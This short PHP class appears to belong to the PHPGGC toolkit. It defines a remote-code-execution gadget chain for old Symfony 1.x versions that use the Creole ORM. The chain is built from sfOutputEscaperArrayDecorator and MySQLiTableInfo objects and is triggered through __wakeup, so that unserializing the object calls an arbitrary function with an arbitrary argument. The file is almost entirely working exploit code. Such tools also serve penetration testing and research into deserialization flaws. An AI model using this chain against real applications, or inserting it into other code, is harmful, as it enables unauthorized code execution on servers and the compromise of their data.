<?php

namespace GadgetChain\Symfony;

class RCE15 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.0.0 <= 1.1.9';
    public static $vector = '__wakeup';
    public static $author = 'darkpills';
    public static $information = 'With Creole ORM';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));
        $tableInfo = new \MySQLiTableInfo($escaper);
    
        return $tableInfo;
    }
}
